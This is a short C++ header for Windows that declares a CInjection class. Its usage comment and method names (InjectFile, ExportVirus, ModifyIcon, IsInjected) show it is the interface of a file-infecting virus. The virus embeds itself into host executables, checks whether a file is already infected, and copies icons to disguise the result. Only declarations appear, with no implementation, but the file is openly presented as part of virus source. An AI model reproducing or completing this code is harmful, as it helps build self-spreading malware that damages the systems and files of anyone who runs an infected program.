#pragma once
#include "windows.h"
//HAS_BEEN_INJECTED : This is an injected file and don't need to inject again
#define HAS_BEEN_INJECTED 2
#define INJECTION_SUCCESS 1
#define INJECTION_FAIL 0
#define INJECTION_RESOURCE_ID 99


/**
	usage:
	CInjection injection;
	int ret = injection.InjectFile (NORMAL_FILE);
	printf("%d",ret);
	if (ret == HAS_BEEN_INJECTED)
	{
		injection.ExportVirus ();
	}
*/
class CInjection
{
public:
	int InjectFile(TCHAR *host,BOOL modifyIcon=FALSE);
	int ExportVirus();
	int ModifyIcon(TCHAR szDst[],TCHAR szSrc[]);
    BOOL IsInjected(TCHAR * szSrc);
protected:
	void OutPut(TCHAR *);
	bool GetPos(TCHAR m_path[MAX_PATH],int a);
	DWORD dwSize1[256],dwSize2[256];
	DWORD dwPos1[256],dwPos2[256];
	int count1,count2;
};
